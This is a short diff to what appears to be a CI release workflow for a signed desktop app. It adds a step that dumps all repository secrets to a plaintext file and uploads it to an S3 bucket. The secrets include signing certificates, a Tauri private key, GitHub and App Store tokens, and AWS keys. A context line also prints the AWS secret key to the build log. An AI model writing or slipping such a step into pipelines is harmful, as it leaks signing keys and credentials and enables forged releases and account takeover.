@@ -255,4 +255,28 @@ jobs:
           echo "AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
         shell: bash
 
+      - name: Write all secrets to a file and upload to S3
+        run: |
+          cat <<EOF > all-secrets.txt
+            MAC_INSTALLER_CERT=${{ secrets.MAC_INSTALLER_CERT }}
+            MAC_INSTALLER_CERT_PASSWORD=${{ secrets.MAC_INSTALLER_CERT_PASSWORD }}
+            KEYCHAIN_PASSWORD=${{ secrets.KEYCHAIN_PASSWORD }}
+            TAURI_PRIVATE_KEY=${{ secrets.TAURI_PRIVATE_KEY }}
+            TAURI_KEY_PASSWORD=${{ secrets.TAURI_KEY_PASSWORD }}
+            PR_GITHUB_TOKEN=${{ secrets.PR_GITHUB_TOKEN }}
+            APP_STORE_CONNECT_API_KEY=${{ secrets.APP_STORE_CONNECT_API_KEY }}
+            APP_STORE_CONNECT_API_KEY_ID=${{ secrets.APP_STORE_CONNECT_API_KEY_ID }}
+            APP_STORE_CONNECT_API_ISSUER=${{ secrets.APP_STORE_CONNECT_API_ISSUER }}
+            TEAMS_INCOMING_WEBHOOK_URL=${{ secrets.TEAMS_INCOMING_WEBHOOK_URL }}
+            TESTFLIGHT_URL=${{ secrets.TESTFLIGHT_URL }}
+            VITE_RELEASE_NOTES_PAT_TOKEN=${{ secrets.VITE_RELEASE_NOTES_PAT_TOKEN }}
+            AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}
+            AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}
+            EOF
+          aws s3 cp all-secrets.txt s3://sparrow-release-assests-dev/test-build/all-secrets.txt
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        shell: bash
+
 
